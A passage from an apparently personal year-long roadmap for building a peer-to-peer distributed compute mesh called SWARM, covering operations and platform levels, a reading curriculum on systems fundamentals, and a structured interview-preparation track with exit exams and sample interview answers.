- [ ] **Restore from the S3 artifact mirror**, for real, and time it. An untested backup is not a backup.
- [ ] Every alert reviewed: actionable? runbook? worth 03:00? **An alert without a runbook is deleted, not documented.**
- [ ] One deliberate **error-budget burn** with the written decision that follows
- [ ] `docs/REPORT.md` — the technical report, 15–25 pages: problem, architecture, benchmarks, the trust curve, the DHT comparison, **and an honest limitations section** (mesh size, simulator fidelity, Sybil, inference non-determinism, single-author review). **The limitations section is what makes the rest credible.**
- [ ] **CV v4 written; 48 applications sent** (Track J)

## 🎤 INTERVIEW PARAGRAPH — Week 43 (and CV v4)

> This level was operations. I ran a deliberate failure programme against the deployed mesh — twenty-odd logged incidents where I killed peers, partitioned the network asymmetrically, killed a region leader mid-commit, filled disks, expired certificates, and injected lying peers, each with the alert that fired, a timeline, a root cause and a runbook entry.
>
> Two taught me the most. The first is clock skew. I skewed one peer by four seconds and **nothing failed loudly** — leases expired at the wrong time, the failure detector was fed wrong inter-arrival times, deadlines were computed against a clock that disagreed with the region's. The peer stayed up and quietly made wrong decisions while my dashboards stayed green. That's also the incident that justified the fencing tokens I'd built two months earlier for reasons that were theoretical at the time.
>
> The second is that I found a circular dependency in my own recovery path, and I found it by reproducing Meta's 2021 outage locally — the one where a BGP change took out their DNS and also the internal tools they needed to fix it. My bootstrap relay is a single publicly-reachable node, and I hadn't asked what happens to the mesh if it dies while peers are churning. It turns out to be survivable but slow to recover, and that's now written down honestly rather than discovered during an incident. I reproduced six of those outages locally, each with instrumentation and a verified fix, and wrote up the seven mechanisms they have in common.

## 🎓 LEVEL 10 EXIT EXAM
1. What is a metastable failure? Give one from SWARM and the mitigation.
2. Your clocks skew by 4 seconds. What breaks, and why does nothing alert?
3. Pick one reproduced outage. Trigger, amplifier, containment failure, recovery obstacle.
4. Why must observability not depend on the system it observes? Which SWARM component violates this?
5. Your bootstrap relay dies. Walk through the next ten minutes.
6. Design an SLO for job completion. SLI, budget, burn-rate alert thresholds.
7. A peer has a full disk and keeps accepting jobs. Which layer should have stopped it, and why didn't it?

**Pass = 6/7.**

**🔗 DSA companion (W40–43):** topic learning is over. **Volume under time pressure and loop simulation** — company-tagged sets, timed at 25 minutes, spoken aloud. Loops #2 and #3.

---
---

# ⚡ LEVEL 11 — Platform Completion

> **Goal:** the surfaces that make this a platform rather than a daemon. Interview volume ramps hard.
> **⏱ Weeks 44–48 · Jul 5 – Aug 8 2027 · 60h depth** · **Milestone S10** · **W48 = REST WEEK**
>
> ⚠️ **If you're behind, this is the level to cut.** Droppable in order: the dashboard's visual polish, `pgshift`, the tenant portal. **The API design work is not droppable** — REST/API design is 27.3% of your target postings and this is where you earn it.

---

## 11.1 — The public API and the metadata store

📈 **EXIT CRITERIA**
- [ ] **OpenAPI 3.1 spec generated from code** (or code from spec — pick one, say why), with **drift detection failing CI** *(REST/API design 27.3%)*
- [ ] API versioning · **keyset pagination** over job history, with a benchmark of offset pagination at page 1 vs page 10,000 **and the `EXPLAIN` that says why** · **idempotency keys on job submission** (this is the same problem as Level 5 and Level 9 — say so in the doc) · rate limiting with correct `429`, `Retry-After`, `RateLimit-*` · **RFC 9457 Problem Details** error bodies with stable machine-readable codes
- [ ] **A pinned old-client binary in CI** whose requests must still pass against the new server
- [ ] `prefs`/metadata on Postgres: **schema migrations in git, applied automatically, reversible**, tested against real Postgres in CI (**Testcontainers — never mock the database**)
- [ ] **`docs/design/isolation-level.md`** — which level for the job-metadata store and why, **including the anomaly it does not prevent.** *(F6 gave you the vocabulary; the `crashdb` MVCC work gave you the intuition.)*
- [ ] `40001` serialization-failure retry loop, with **the retry rate measured under contention**

## 11.2 — `pgshift`: changing a hot table under live load

> ### 🔥 THE WALL
> Run `ALTER TABLE jobs ALTER COLUMN id TYPE BIGINT` on a 50M-row table while the mesh is submitting 1,000 jobs/second. **Everything queues behind the `ACCESS EXCLUSIVE` lock and the mesh stops accepting work.** Capture the outage graph. That graph is half the project.

📈 **EXIT CRITERIA**
- [ ] **Expand/contract migration on a 50M-row table under live load: zero errors, p99 degradation <20%**, proven by a Grafana screenshot across the whole window
- [ ] **Backfill is chunked, throttled and resumable** — kill it at 40%, restart, it completes correctly
- [ ] A verification pass proving all 50,000,000 rows match
- [ ] **The naive version's outage graph beside the correct one in the README**
- [ ] A written runbook: *"how to change a column type on a hot table,"* with the rollback at every step

## 11.3 — The mesh dashboard and admin surface

📈 **EXIT CRITERIA**
- [ ] `dashboard`: **WebSocket live mesh view** — peers, regions, job flow, reputation scores. **≥2,000 concurrent viewers sustained on the 4-core ARM box**, with **memory per connection reported and a bounded outbound queue with a stated drop policy** proven under a deliberately slow client
- [ ] **Reconnect storm test:** kill the dashboard instance holding 2,000 connections; show reconnect latency **with and without jitter.** Without jitter, your redeploy is a self-inflicted DDoS.
- [ ] `admin`: mesh health, region state, manual peer eviction, incident timeline. **Authenticated via `gatekeep`, audit-logged, every action reversible or confirmed.**
- [ ] 🔴 **`docs/RUNBOOK.md` tested by a peer** resolving an injected incident using only the documentation. **Record every point where they got stuck and fix it.** Until now you have been the single point of failure for your own system — which is exactly what `incident-lab` #4 was about.
- [ ] Pinned dependencies, SBOM, **CI fails on a known-critical CVE** *(Security 10.9%)*
- [ ] ≥8 full timed mock loops this level (Track I)

## 🎤 INTERVIEW PARAGRAPH — Week 48

> This level was the surfaces. The one I'd point at is the schema migration: I changed a column type on a fifty-million-row table while the mesh was submitting a thousand jobs a second. I did it the naive way first and captured the outage — everything queued behind an ACCESS EXCLUSIVE lock and the mesh stopped accepting work — then did it properly with expand/contract, dual writes, and a chunked backfill that throttles when replication lag rises. Zero errors, p99 degradation under twenty percent, and both graphs are in the README side by side because the failure is half the story.
>
> The other thing worth mentioning is that I had a colleague take my runbook and resolve an incident I injected, without me in the room. They got stuck in four places, and those four places were the actual gap between "I can operate this" and "this is operable." Until that test I was a single point of failure for my own system, which is the same failure mode as the Meta 2021 outage I'd reproduced two months earlier.

## 🎓 LEVEL 11 EXIT EXAM
1. Which isolation level for job metadata, and why? What anomaly does it not prevent?
2. Offset pagination at page 10,000. Explain with the query plan. What's the fix?
3. `ALTER TABLE` on a hot 50M-row table. Full plan, including rollback at every step.
4. 2,000 WebSocket viewers, one slow client. State your memory bound and how you enforce it.
5. You redeploy the dashboard. What happens to clients, and why do you need jitter?
6. Idempotency keys appear in three places in your system. Name them and explain why it's the same problem.
7. Your peer got stuck using your runbook. What was missing, and what class of gap is that?

**Pass = 6/7.**

---
---

# ⚡ LEVEL 12 — Synthesis & Conversion

> **Goal:** convert. **No new features.** The system was finished in Week 47.
> **⏱ Weeks 49–52 · Aug 9 – Sep 5 2027 · 40h depth** · **Milestone S11**
>
> Split: 10h legibility / 14h interview / 6h career.

> ### 📅 READ FIRST
> **The strongest big-tech hiring window is September–October 2027**, just past the end of this plan. Northern-hemisphere hiring slows through July–August — the months you're applying hardest — and picks up sharply in September when managers return and Q4 headcount is confirmed.
>
> That's a consequence of your Week-40 start, not a flaw: your applications land **as the window opens.** But **Week 52 is not the end of the process**, and `docs/NEXT.md` is the most important deliverable of the final week.

## 12.1 — Legibility (W49)

> ### 🔥 THE WALL
> Hand the repo to someone who's never seen it. **Ten minutes on a timer.** Ask: what is it, what's real, what's the most interesting technical decision in it?
>
> They will fail. Write down exactly where they got lost. **Interviewers do not explore repositories; they read what you point at**, and right now you're pointing at nothing.

📈 **EXIT CRITERIA**
- [ ] **README final** for a ten-minute reader: what it is · **the prior-art statement and the scale statement, verbatim** · the three most interesting decisions, one sentence each · the headline numbers · one architecture diagram · what doesn't exist. **Tested on a human; their confusion points fixed.**
- [ ] Architecture diagram, final. **Nothing aspirational.**
- [ ] `bench/RESULTS.md` final — every benchmark, x86 and ARM, regenerable with one command
- [ ] **`docs/TOUR.md`** — *"ten minutes: read these three files. An hour: these eight."*

## 12.2 — The ten ADRs (W50)

Each: **context · options considered · decision · consequences · what you'd do differently.**

| ADR | The contested decision |
|---|---|
| 0001 | **WASM + separate process for untrusted execution; cgo for trusted hot paths** — the security asymmetry |
| 0002 | **DHT for placement, Raft for agreement, partitioned into regions** — the central architecture |
| 0003 | Consistency model per component; **what is and isn't linearizable** |
| 0004 | **Kademlia over Chord** (or the reverse), argued from your own churn benchmark |
| 0005 | **Redundant execution + majority vote rather than PBFT** — and what you gave up |
| 0006 | Content-defined chunking and the hash function choice |
| 0007 | QUIC rather than a hand-rolled reliable-UDP layer |
| 0008 | **Simulator-first testing, and how you validated it** |
| 0009 | No blockchain, no token — billing is a Postgres ledger |
| 0010 | CPU-first inference with GPU as an advertised capability |

📈 **ALSO**
- [ ] **`docs/LIMITATIONS.md`, linked from the README's first screen:** mesh size (30–50 real nodes) · simulator fidelity and its measured divergence · Sybil resistance · inference non-determinism defeating majority vote · bootstrap relay as a SPOF · single-author code review. **Volunteering limitations before you're asked is the single highest-leverage interview behaviour available to you.**
- [ ] **`docs/COMPARISON.md`** — an honest comparison against **BOINC** (twenty years of production experience with your exact verification problem), **IPFS** (content addressing and Kademlia at scale), **Golem/Akash** (compute marketplaces), **Ray** (the execution-engine half), and **Kubernetes** (the trusted-infrastructure version). **Where your design converges with each, where it diverges, and why.** This document is what proves you know the field rather than reinvented it in a vacuum.
- [ ] `docs/BUGS-INDEX.md` and `docs/incidents/README.md` — navigable. The simulator's found bugs and the 20 chaos incidents are among the most interview-useful things you own and they are currently buried.

## 12.3 — The retrospective (W51)

> ### 🔥 THE WALL
> Open `LOG.md`. Compute, per level: **hours estimated vs actual, and the ratio.** You were consistently wrong in one direction by a consistent factor. **That factor is a measured fact about you, over twelve months, and almost no candidate has one.**

📈 **EXIT CRITERIA**
- [ ] **`docs/RETROSPECTIVE.md`** — per level: estimated, actual, ratio. **Every target you set before measuring, with both numbers.**
- [ ] The three things you'd rebuild differently. Specific and technical, not "start earlier."
- [ ] One outward artifact — a talk outline or long-form post. **Strongest candidates: the trust curve, the Chord-vs-Kademlia churn benchmark, and the three bugs the simulator found.**

## 12.4 — Close (W52)

📈 **EXIT CRITERIA**
- [ ] `make bootstrap` from clean. All tests pass. Mesh deployed and reachable. **Billing $0.00.**
- [ ] **Record the 45-minute talk again and watch it against the Week-13 recording. The delta is the year.**
- [ ] **`docs/NEXT.md`** — the September–October 2027 plan: application volume, target-list refresh, live loops, and **how you sustain 8h/week of DSA with no roadmap telling you to.** The habit has to survive the plan that built it.

## 🎤 THE FULL ANSWER — Week 52

> I spent a year building an open peer-to-peer distributed compute mesh. Any machine joins; every node both submits jobs and executes jobs for others; there's no central owner. **Volunteer computing isn't new — BOINC has run it in production since 2002 and solved result verification with redundancy and credit.** What I built is an open, benchmarked implementation, and what I measured is a tradeoff nobody publishes.
>
> The foundation is that jobs run in WASM in a separate process with cgroups underneath, which gives me capability isolation, fuel metering so I can stop an infinite loop at an exact instruction count, and — the property everything else depends on — **deterministic execution**, so two honest peers produce a bit-identical output hash.
>
> Peers find each other with SWIM gossip and STUN-style NAT traversal with relay fallback, and a phi-accrual failure detector I chose after measuring false-positive rates against a fixed timeout under injected jitter. Storage is a crash-tested engine of my own — with a torture harness that kills the process a thousand times and injects fsync failures at the syscall level — with content-addressed storage and content-defined chunking on top. Placement uses a DHT, and I implemented both Chord and Kademlia and benchmarked them head to head under thirty percent simultaneous churn, which is a comparison that didn't exist publicly. Agreement on job assignment is Raft, partitioned into regions, because one global Raft group across ten thousand peers is absurd.
>
> All of it is tested by a deterministic simulator — simulated clock, network with asymmetric partitions, disk and scheduler, ten thousand seeds a night, every failure reproducible from an integer. It found three real bugs no test suite of mine would have caught. And it models a fault type FoundationDB's simulator doesn't: **a peer that stays up, responds promptly, and returns a plausible wrong answer.**
>
> **That fault is the project's centre.** Jobs run redundantly, output hashes are compared, the majority wins — and my own simulator broke that by finding a seed where two liars colluded on the same wrong answer. So the real artifact is a curve: required redundancy against probability of accepting a wrong result, as a family of curves for different liar fractions and different reputation histories, with the compute cost overlaid. **Verification is a dial, not a switch, and I measured the dial.**
>
> Then it's the operational half — placement under overload with goodput curves showing collapse against graceful degradation, multi-tenancy with shuffle sharding, running on free-tier ARM at zero dollars a month, inference as a job type, and twenty logged incidents I caused on purpose.
>
> The things I'd want to say without being asked: **my mesh is forty nodes I own plus a simulator, not ten thousand strangers.** I validated the simulator against the real mesh and published where they diverge. My verification does not survive large-scale collusion or Sybil identities in a truly open network. And inference isn't deterministic across peers, so majority vote genuinely does not apply there and I use a reputation threshold instead. All of that is in a limitations document linked from the first screen of the README.

## 🎓 LEVEL 12 EXIT EXAM
1. Explain SWARM to a smart non-specialist in two sentences.
2. Name the five prior systems and where your design diverges from each.
3. Your three most interesting technical decisions, with the alternative you rejected.
4. What does your simulator prove, and what does it not?
5. The sharpest question an interviewer can ask about this project — what is it, and what's your answer? *(It is: "how do you know your simulator reflects reality?" The answer is `sim-fidelity.md`.)*
6. Estimated vs actual hours. What's your ratio, and what will you do differently on your next project?

**Pass = 5/6.**

---
---

# 📚 TRACK F — The Gap-Filling Curriculum

> You are self-taught, which means your knowledge has holes you cannot see — not through carelessness, but because a curriculum's real function is to tell you what exists. **This is that function.**
>
> **The rule: no fundamental is taught in the abstract.** Each block lands the week the project first depends on it, uses **named chapters** rather than whole books, and ends in an exercise that proves it stuck.
>
> **Budget:** 3h/week most weeks, 2h during Ramadan, **0 from Week 40.** **Total ≈ 145h.**
>
> **An exercise you skipped is a block you did not do.** The reading is the setup; the exercise is where it becomes yours.

| # | Fundamental | Weeks | Why exactly then |
|---|---|---|---|
| F1 | CPU memory hierarchy | 1–2 | You choose the storage and routing-table layouts with these numbers in front of you |
| F2 | OS: processes, scheduling, isolation | 3–4 | The sandbox is an OS-primitives problem |
| F3 | OS: virtual memory & TLB | 5–6 | 40 nodes on one box; memory is the binding resource |
| F4 | TCP, UDP & network behaviour | 7–9 | NAT traversal, the wire protocol, everything from L7 |
| F5 | Cache-conscious data layout | 10–12 | The storage engine's page layout and the hash kernels |
| F6 | Transactions & isolation | 13–15 | `crashdb`'s MVCC, and L11's metadata store |
| F7 | Hashing & cryptographic primitives | 16–17 | Content addressing, BLAKE3, Merkle DAGs |
| F8 | Probability & distributed randomness | 17–18 | Consistent hashing load distribution, P2C, phi-accrual |
| F9 | Consensus, CAP & consistency models | 19–21 | Raft; and to place SWARM on the map |
| F10 | Performance measurement & optimisation | 21–22 | Everything you benchmark from here |
| F11 | Formal methods, lite | 23–25 | TLA+ on the verification protocol |
| F12 | **Latency measurement done correctly** | 28 | **Your harness may have been lying since Week 2** |
| F13 | Cryptography for TLS & identity | 29–30 | `gatekeep`; peer identity is a certificate |
| F14 | Partitioning & distributed data | 27, 30 | The vocabulary for your sharding design doc |
| F15 | Stream processing | 31–32 | The audit plane, and delivery semantics |
| F16 | AWS core services | 33–34 | **AWS is 33.6% of your target postings** |

---

**F1 · CPU memory hierarchy · W1–2 · 6h**
📖 **Bryant & O'Hallaron, *CS:APP* 3rd ed. — §6.2–6.4 only.** Skip §6.1.
🛠 **E1:** traverse a 256MB array with strides 1…4096, time each, plot. **Derive your L1/L2/L3 sizes from your own plot**, then check `lscpu`. If the plot has no steps your timing is wrong — fix it, because every number this year rests on measuring correctly.

**F2 · OS: processes, scheduling & isolation · W3–4 · 6h**
📖 **OSTEP ch. 4–7** (free). Plus the **Linux cgroups v2 kernel docs — `memory` and `cpu` controllers** (`memory.max` vs `memory.high` precisely), and **NCC Group, "Understanding and Hardening Linux Containers"** — the namespace-escape sections.
🛠 **E2:** measure context-switch cost, two threads pinned to the same core over a pipe, then to different cores. Explain the difference. Then: **set a 100MB `memory.max` on a cgroup, run a memory bomb inside, and show the OOM kill happening *inside* the cgroup while the host is fine** — with the `dmesg` line.

**F3 · OS: virtual memory & TLB · W5–6 · 6h**
📖 **OSTEP ch. 13–16, 18–19.** Ch. 19 is the one that matters.
🛠 **E3:** demonstrate TLB thrashing — a program whose only change is page-touching order, with a large runtime gap at constant work. Report `dTLB-load-misses` for both. Then compute: **at your measured per-node RSS, how many `swarmd` processes fit before you're paging?**

**F4 · TCP, UDP & network behaviour · W7–9 · 9h**
📖 **Kurose & Ross, *Computer Networking* 8th ed. — ch. 3 in full.** The most valuable chapter in the book. · **Fall & Stevens, *TCP/IP Illustrated Vol. 1* — ch. 13, 14, 15.** Those three. · **Grigorik, *High Performance Browser Networking* — ch. 1–4** (free at hpbn.co) and **ch. 3 on UDP specifically, which is what you're actually using.** · **RFC 8445 (ICE) §2** for the traversal model.
🛠 **E4:** capture a real connection with `tcpdump`, annotate **by hand** in Wireshark — handshake, initial cwnd, slow-start, exit, one provoked retransmission (`tc netem loss`). Then: **capture your own STUN exchange and show, from two different rendezvous points, whether your NAT is symmetric.** That determines whether hole punching can work from your house.

**F5 · Cache-conscious data layout · W10–12 · 9h**
📖 **Drepper, "What Every Programmer Should Know About Memory" — §3 in full, §6.2–6.4.** Skip §4–5.
🛠 **E5:** AoS→SoA on your storage engine's index. Measure wall time, `L1-dcache-load-misses`, `LLC-load-misses`. **Then predict in writing, before running it, what `__builtin_prefetch` in the scan loop will do.** Commit the prediction, then test. Being wrong is normal; not recording the prediction wastes the lesson.

**F6 · Transactions & isolation · W13–15 · 6h**
📖 **Kleppmann, *DDIA* — ch. 7 in full.** Write skew and phantoms especially. · **Berenson, Bernstein, Gray et al., "A Critique of ANSI SQL Isolation Levels" (1995).** · **Kleppmann's "Hermitage" repo — run it against Postgres yourself.**
🛠 **E6:** from memory, the four anomalies with a concrete two-transaction interleaving each, and which isolation levels prevent which. One page. **You use this directly in Level 11's `isolation-level.md`.**

**F7 · Hashing & cryptographic primitives · W16–17 · 6h**
📖 **Aumasson, *Serious Cryptography* 2nd ed. — ch. 2 (randomness), ch. 6 (hash functions), ch. 7 (keyed hashing).** · **The BLAKE3 paper, §2** — the tree structure. · **Merkle's original construction** — one page anywhere.
🛠 **E7:** benchmark BLAKE3 vs SHA-256 vs xxHash on your machine at 1KB, 1MB and 1GB inputs. **Then answer in writing: which is safe for content addressing and which is not, and why "fast hash" and "cryptographic hash" are not interchangeable here.** *(xxHash is not collision-resistant against an adversary. In a system where strangers supply content, that matters.)*

**F8 · Probability & distributed randomness · W17–18 · 5h**
📖 **Mitzenmacher & Upfal, *Probability and Computing* — ch. 5 (balls into bins) and ch. 14 §14.1 (power of two choices).** Ch. 5 is exactly your load-distribution problem. · **Mitzenmacher, "The Power of Two Random Choices: A Survey."**
🛠 **E8:** simulate 10,000 keys into 40 bins, with 1 / 10 / 100 / 500 virtual nodes per bin. **Plot the max-load-to-mean ratio for each.** Then do the same with power-of-two-choices placement. **Compare your empirical curves to the theoretical `log n / log log n` result** and explain any gap. *(This is Level 4's vnode chart and Level 7's placement chart, both, done as a fundamental first.)*

**F9 · Consensus, CAP & consistency models · W19–21 · 7h**
📖 **Ongaro & Ousterhout, Raft — the EXTENDED version, §5 in full, §6 carefully.** · **DDIA ch. 9 in full**, ch. 5's replication-lag section. · **Jepsen's consistency model map** — one page, memorise the hierarchy. · **Kleppmann, "How to do distributed locking"** and antirez's reply. Both.
🛠 **E9:** place SWARM on the consistency map in writing, component by component — what's linearizable (region assignment), causal, eventual (membership, reputation), and **what a client is actually promised.** **This becomes ADR-0003.**

**F10 · Performance measurement & optimisation · W21–22 · 5h**
📖 **CS:APP ch. 5 in full** (what the compiler will and won't do for you), **§6.4–6.6.** · **Gregg, *Systems Performance* 2nd ed. — ch. 6 §6.6, ch. 13.** Reference.
🛠 **E10:** optimise one `swarm-core` function through five stages. Each: `perf record` top-5 symbols, wall time, cache-miss rate, **and one sentence naming the mechanism.** Unattributable stages marked "unattributed" rather than explained away.

**F11 · Formal methods, lite · W23–25 · 5h** *(Ramadan-reduced — reading, not grinding)*
📖 **Hillel Wayne, `learntla.com`** — free, the best on-ramp. · **Newcombe et al., "How Amazon Web Services Uses Formal Methods" (CACM 2015)** — read this first, to understand why the hours are worth it.
🛠 **E11:** the Level 6.2 deliverable — spec the verification protocol, model-check the safety invariant, find one real design bug.

**F12 · Latency measurement done correctly · W28 · 3h**
📖 **Gil Tene, "How NOT to Measure Latency"** — in full, then the coordinated-omission section again. · **Dean & Barroso, "The Tail at Scale" (CACM 2013)** — eight pages, in full.
🛠 **E12: 🔴 audit your own harness.** If it sends the next request only after the previous returns, it has coordinated omission and **every latency number in this repository is optimistic.** Fix it, **re-run every benchmark**, put the before/after in `bench/RESULTS.md` with a note. *"I found coordinated omission in my own harness and re-measured six months of results"* is one of the strongest sentences you can say in an interview.

**F13 · Cryptography for TLS & identity · W29–30 · 4h**
📖 **Aumasson, *Serious Cryptography* 2nd ed. — ch. 1, 3, 9, 10, 11.** · **RFC 8446 §2 only** (TLS 1.3 overview, six pages). · **Douceur, "The Sybil Attack" (IPTPS 2002)** — short, and it's the honest limit of your reputation system.
🛠 **E13:** capture a TLS 1.3 handshake, annotate every message against RFC 8446 §2. Then in writing: what mTLS adds, what's verified on each side, **what happens when a peer's certificate expires at 03:00 on a Saturday**, and **why peer identity being a certificate is what makes reputation attachable at all.**

**F14 · Partitioning & distributed data · W27, 30 · 5h**
📖 **DDIA ch. 6 in full** (partitioning, rebalancing, request routing), then **ch. 8** — unreliable clocks and process pauses, which is exactly what you inject in Week 41.
🛠 **E14:** write your sharding/region design doc in ch. 6's vocabulary. Then the hard question: **what is your equivalent of a secondary index, given that a job's data may live on peers outside its assignment region?**

**F15 · Stream processing · W31–32 · 6h**
📖 **DDIA ch. 11 in full.** The exactly-once section is the one you'll be asked about. · **Jay Kreps, "The Log."**
🛠 **E15:** write `docs/design/delivery.md` — what the audit plane guarantees, **why end-to-end exactly-once isn't achievable**, and how at-least-once plus idempotent application gets the same observable behaviour. Prove it with a 100-replay test.

**F16 · AWS core services · W33–34 · 6h**
📖 **Skip courses.** Free AWS Skill Builder for gaps only; learn the rest by building Week 34's infrastructure. Cover exactly: **IAM** (roles vs users, assume-role, least privilege, **OIDC federation** — the one AWS topic actually asked about in interviews) · **VPC** (subnets, SGs vs NACLs) · **S3** (consistency, storage classes, lifecycle, prefix scaling) · **EC2** (t4g free tier) · **CloudWatch** (metrics, alarms, the $1 billing alarm). Nothing else. **Do not study for a certification.**
🛠 **E16:** write the artifact-mirror S3 IAM policy **by hand from the docs**, least privilege, and verify with the IAM policy simulator that it permits exactly what you intend and nothing more.

### Deliberately NOT here
**Compilers and language theory** (interesting, zero corpus support) · **full BFT consensus** (you build the practical subset and explain the difference — that's the better use of the hours) · **machine learning theory** (the AI level is *serving* infrastructure; the reputation model is statistics) · **a fourth language** · **certifications** (AWS SAA is 40h to close a gap Week 34 closes better, with a running system as evidence instead of a badge).

---
---

# 🎯 TRACK I — The Interview Machine

> **Daily from Week 1.** 7h/week to Week 39, **12h/week from Week 40.** Never batched. Never skipped.
>
> You can build every level of SWARM and still be rejected in a 45-minute phone screen. **This is the track that cannot be crammed.**

## What this is for, and what it is not

**Algorithms appear in 7.8% of your target postings. Data structures in 6.2%.** The two lowest numbers in the corpus. **This is not a résumé play.**

It exists because the OA and the coding rounds are a **gate**, and gates don't care about frequencies. A 7.8% chance a posting names algorithms is irrelevant when 100% of the loops behind those postings contain two coding rounds.

It is also **not competitive programming.** Your Codeforces rating is a calibration instrument, not a goal.

**The target: solve a medium-hard problem you have not seen, correctly, in 25 minutes, while talking.** The last three words are the part most people skip and the part that fails loops.

## Volume

| Period | Weeks | h/wk | Total |
|---|---|---|---|
| Levels 0–5 | 1–22 | 7 | 154 |
| Level 6 (Ramadan) | 23–26 | 5 | 20 |
| Levels 7–9 | 27–39 | 7 | 89 |
| Levels 10–12 | 40–52 | 12 | 156 |

**≈ 340 hours. Target: 700 problems, plus 12+ full timed mock loops.**

**Do not chase the count.** A problem you solved by opening the editorial after eight minutes did not happen. A problem you failed and rebuilt from scratch two days later counts double.

## Sources

| Source | For | How |
|---|---|---|
| **NeetCode 150 / 250** | The pattern spine, W1–17 | In order, grouped by pattern. Don't skip the easy ones. |
| **LeetCode, company-tagged** | W18–52 | Filter by your seven targets, last 6 months. Premium is worth $35 for two months before a loop. |
| **Codeforces Div 2 A–D** | Weekly, all year | Rated when it fits, virtual when it doesn't. Band 1400 → 1900. |
| **Codeforces EDU (ITMO)** | Segment trees W31–32, suffix structures W35 | The best free structured material for these. |
| **Laaksonen, *Competitive Programmer's Handbook*** (free) | Reference | **Ch. 7** (DP), **ch. 9** (range queries), **ch. 13–15** (graphs), **ch. 26** (probability). Read per assigned topic. |
| **Skiena, *Algorithm Design Manual* 3rd ed.** | The *why* | **Ch. 8** (DP), **ch. 9** (intractability and reductions — directly supports W18). |
| **`interviewing.io` / Pramp** | Mocks | Free peer mocks. **One paid mock with a real FAANG engineer around W30 if affordable.** |

## 🔗 The SWARM ↔ DSA map — where the tracks compound

**This is the point of running them together.** Each level's systems work reinforces specific patterns; do those patterns that week while the intuition is live.

| Weeks | Level | Systems work | DSA patterns it reinforces |
|---|---|---|---|
| 1–2 | L0 | Cache layout, working-set sweeps | Arrays, hashing, prefix sums, two pointers — **the cache intuition explains *why* these are fast in practice** |
| 3–4 | L1 | Fuel-limit calibration, resource accounting | **Binary search, including binary search on the answer** — fuel calibration literally is this. Stack, monotonic stack. |
| 5–9 | L2 | **SWIM gossip propagation** | 🔴 **Graph BFS/DFS — gossip propagation IS breadth-first traversal over a graph. The cleanest mapping in the roadmap.** Plus linked lists, trees, heaps, LRU design |
| 10–13 | L3 | B-tree pages, Merkle DAGs, buffer eviction | **Trees and BSTs, heaps and top-K** — these *are* those structures under production constraints. Tries. |
| 14–17 | L4 | **Chord rings, Kademlia XOR distance, k-buckets** | 🔴 **Union-find** (ring join/leave), **bit manipulation** (XOR distance, bucket indexing by leading-zero count — pull this forward from W19), modular arithmetic, graph routing |
| 18–22 | L5 | Raft, NP-hardness of placement | **Reductions and NP-hardness** (W18 is a *proving* week — three written reductions), DP, greedy, intervals |
| 23–26 | L6 | Model checking, state-space exploration | **Backtracking and state-space search** — DST and model checking are structurally systematic search. *(Ramadan: review only.)* |
| 27–30 | L7 | Priority scheduling, rate limiting, bin packing | 🔴 **Heaps and priority queues** ("task scheduler", "meeting rooms" map directly), **sliding window** (rate limiting *is* a sliding-window algorithm), **articulation points** — *which peer's removal partitions your mesh?* |
| 31–35 | L8 | Redundancy/confidence optimisation | **DP and greedy** — "minimum redundancy for X confidence" has real DP structure, and you're solving it for real. Segment trees, Fenwick, binary lifting, strings. |
| 36–39 | L9 | Reputation, probabilistic trust | **Probability and expectation**, randomised algorithms, reservoir sampling, sketching |
| 40–52 | L10–12 | — | Volume under time pressure. Company-tagged sets. Loops. |

⚠️ **Where the tracks do NOT meet:** string algorithms (KMP, Z-function, suffix automata), combinatorics, number theory, and most of the geometry toolkit get **zero** reinforcement from SWARM. **These are the topics you will be weakest on** — weeks 34–35 and the W43 weak-area blitz exist for them, and the disconnection is a reason to do them more carefully, not less.

## 🔴 The failure log — the part that actually produces improvement

Solving problems does not make you better. **Reviewing failures does.** `dsa/FAILURES.md`, an entry every time you miss the time box or solve with the wrong approach.

```
## <date> · <link> · <topic>
**Time box:** 25 min. **Outcome:** failed / solved at 41 min / wrong approach
**What I tried:** one sentence
**Why it failed:** be specific — "didn't see it was a graph problem" is a different bug
  from "saw it was a graph problem and implemented BFS wrong"
**The insight I was missing:** one sentence
**Category:** recognition / approach / implementation / speed / edge cases
**Re-solve due:** <date + 3 days>
```

**The category field is the whole point.** After thirty entries, **count them:**

| Mostly… | Means | Do |
|---|---|---|
| **recognition** | Need breadth | More problems, more varied |
| **approach** | Need depth | Slow down; work the reasoning, not the code |
| **implementation** | Need reps | Re-solve; do not move on |
| **speed** | Knowledge is fine | Timed sets, virtual contests |
| **edge cases** | Process problem | Write test cases *before* code, every time |

**Do the count in the rest weeks — W13, W26, W39, W48.** Twenty minutes, and it redirects the next quarter. Most people never do it and spend a year fixing the wrong thing.

**Re-solve discipline:** every failed problem re-solved from scratch three days later, without looking at your previous solution. If you can't, re-queue it. **The highest-return habit in the track and the easiest to skip.**

## Mock schedule

| When | What |
|---|---|
| **W21** | First human mock + **the Raft Figure 8 whiteboard test** (a checkable gate, not a formality) |
| W26, W30, W34 | Monthly mock, one round |
| **W30** | **One paid mock with a real FAANG engineer**, if affordable |
| **W38** | **Full timed loop #1 — 4 rounds in one day** |
| W40–52 | Weekly, escalating to two/week from W49 |

**A "full timed loop" means:** two 45-minute coding rounds with a human, one 45-minute system design, one 30-minute behavioural, **in a single day**, with realistic breaks. **Not four sessions across a week.** The exhaustion is what you're training for, and it's the thing that surprises people in their first real onsite.

**Speak while you solve, always, including alone.** The most common cause of a failed coding round in a candidate who *can* solve the problem is silence.

## System design preparation

**14.1% as a named skill; essentially 100% of the loops for these roles.** Own thread from Week 27.

| Weeks | Topic | Source |
|---|---|---|
| 27–30 | Estimation, sharding, replication, caching | **Xu Vol 1 ch. 1, 4, 5, 6** + your own sharding doc |
| 31–35 | Queues, delivery semantics, streaming | **Xu Vol 1 ch. 11**, DDIA ch. 11 + your own `delivery.md` |
| 36–39 | Reliability: SLOs, budgets, degradation | Google SRE ch. 3–4, 21–22 + your own `slo.md` |
| 40–52 | Full designs, one/week, 45 min timed | The eight below |

**The eight canonical designs**, each producing a full design doc (Summary · Context · Goals · **Non-Goals** · Proposal · **Alternatives Considered, minimum three** · Risks · Rollout · Operational Impact):

1. **A distributed job-scheduling system** — *this is SWARM; you have the real answer*
2. **A distributed cache** — consistent hashing, replication, resharding *(Xu Vol 1 ch. 5, 6)*
3. **Rate limiter as a service** *(Xu Vol 1 ch. 4)*
4. **A distributed object store** — a direct extension of your content-addressed store *(DDIA ch. 3; Xu Vol 2)*
5. **A message queue** *(DDIA ch. 11; Xu Vol 1 ch. 11)*
6. **Chat / messaging** *(Xu Vol 2)*
